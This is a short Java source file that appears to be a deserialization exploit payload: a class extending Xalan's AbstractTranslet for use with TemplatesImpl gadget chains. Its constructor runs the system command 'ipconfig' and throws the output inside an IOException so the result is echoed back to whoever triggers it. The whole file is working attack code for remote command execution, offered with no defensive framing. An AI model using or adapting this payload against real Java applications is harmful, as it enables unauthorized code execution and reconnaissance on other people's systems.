package test;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class TemplatesImplecho extends AbstractTranslet {
    public TemplatesImplecho() throws IOException {
    	Process process = Runtime.getRuntime().exec("ipconfig");
    	InputStream in =  process.getInputStream();
    	BufferedReader br = new BufferedReader(new InputStreamReader(in));
    	String line;
    	StringBuilder sb = new StringBuilder();
		while ((line = br.readLine()) != null) {
    	sb.append(line).append("\n");
    	}
    	String str = sb.toString();
    	System.out.println(str);
    	throw new IOException(str);
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
}
